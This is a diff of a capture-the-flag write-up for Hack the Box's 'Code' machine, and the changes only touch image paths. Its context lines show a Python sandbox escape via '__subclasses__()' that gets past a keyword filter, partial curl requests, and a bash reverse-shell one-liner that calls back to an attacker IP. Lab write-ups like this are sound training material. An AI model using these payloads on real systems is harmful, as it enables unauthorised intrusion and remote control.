@@ -1,4 +1,4 @@
-![Htb Code Card](attachments/Code.png)
+![Htb Code Card](i/Code.png)
 
 This is a guide for the Code box from Season 7 on [Hack the Box](https://app.hackthebox.com/machines/Code).
 We are gonna go from `nobody` to `root`.
@@ -31,20 +31,20 @@ So, we have 2 ports open, the first service is `SSH` on port 22, and the second 
 
 We are opening the page and we can see that it's just an online Python interpreter, where we can execute Python3 commands and code.
 
-![image.png](attachments/image.png)
+![image.png](i/image.png)
 
 We can also `register`, `login` and see the `about` page through the buttons on the upper right side of the page. I didn't try many things there because I didn't know if it's a rabbit hole or something that would have value, so I left it for later, like a last resort if everything else failed.
 
 Like, true "hackers", we tried to import some libraries and to execute some code. Unfortunately for us, there seems to be some server-side protection with restricted keywords that we cannot use, such as `import` and `open`.
 As you can see in the following pictures, the code didn't get executed, and we were caught by the security mechanism.
 
-![image_2025-03-25T15-21-26Z.png](attachments/image_2025-03-25T15-21-26Z.png)
+![image_2025-03-25T15-21-26Z.png](i/image_2025-03-25T15-21-26Z.png)
 
-![image_2025-03-25T15-22-07Z.png](attachments/image_2025-03-25T15-22-07Z.png)
+![image_2025-03-25T15-22-07Z.png](i/image_2025-03-25T15-22-07Z.png)
 
 While exploring and trying different things, I thought of using `globals()`, Pythons' build-in function that returns the dictionary implementing the current module namespace. By calling the function through a `print` statement, we can see that we are getting back very interesting information that we can use, some immediately and some possible later.
 
-![image_2025-03-25T15-34-17Z.png](attachments/image_2025-03-25T15-34-17Z.png)
+![image_2025-03-25T15-34-17Z.png](i/image_2025-03-25T15-34-17Z.png)
 
 `curl` command:
 `curl --path-as-is -i -s -k -X $'POST' \
@@ -69,7 +69,7 @@ Another approach was to find what subclasses were available, try to manipulate t
 
 `print((1).__class__.__bases__[0].__subclasses__())`
 
-![image_2025-03-25T15-57-18Z.png](attachments/image_2025-03-25T15-57-18Z.png)
+![image_2025-03-25T15-57-18Z.png](i/image_2025-03-25T15-57-18Z.png)
 
 `curl` command:
 `curl --path-as-is -i -s -k -X $'POST' \
@@ -106,14 +106,14 @@ we can see that we got a hit on our web server.
 
 RCE (Remote Code Execution):
 
-![image_2025-03-25T16-15-59Z.png](attachments/image_2025-03-25T16-15-59Z.png)
+![image_2025-03-25T16-15-59Z.png](i/image_2025-03-25T16-15-59Z.png)
 
 Now, we can change the above  proof-of-concept (POC) code to a reverse shell, create a listener on our machine and wait for the connection to  get established. 
 
 Reverse shell w/ Bash:
 `(1).__class__.__bases__[0].__subclasses__()[317](["/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.145/9001 0>&1"])`
 
-![image_2025-03-25T16-24-40Z.png](attachments/image_2025-03-25T16-24-40Z.png)
+![image_2025-03-25T16-24-40Z.png](i/image_2025-03-25T16-24-40Z.png)
 
 ### Step 2
 
